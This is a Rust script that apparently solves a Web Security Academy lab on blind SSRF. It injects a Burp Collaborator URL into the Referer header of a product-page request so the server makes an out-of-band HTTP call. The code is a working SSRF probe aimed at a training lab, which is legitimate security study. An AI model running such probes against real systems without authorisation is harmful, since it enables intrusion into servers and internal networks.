/*******************************************************************
*
* Lab: Blind SSRF with out-of-band detection
*
* Hack Steps:
*      1. Inject payload into the Referer header to cause an HTTP
*         request to the burp collaborator
*      2. Check your burp collaborator for the HTTP request
*
********************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a6500d9044a26698a400d3a000000f0.web-security-academy.net";

// Change this to your burp collaborator domain
const BURP_COLLABORATOR: &str = "ojbe5v7hak1nxpynrlu5iatd248vwlka.oastify.com";

fn main() {
    println!("⦗#⦘ Injection point: {}", "Referer header".yellow(),);
    print!("❯❯ Injecting payload to cause an HTTP request to the burp collaborator.. ",);
    io::stdout().flush().unwrap();

    let payload = format!("https://{BURP_COLLABORATOR}");
    fetch_product_with_referer(&payload);

    println!("{}", "OK".green());
    println!("🗹 Check your burp collaborator for the HTTP request");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn fetch_product_with_referer(referer: &str) {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}/product?productId=1"))
        .header("Referer", referer)
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
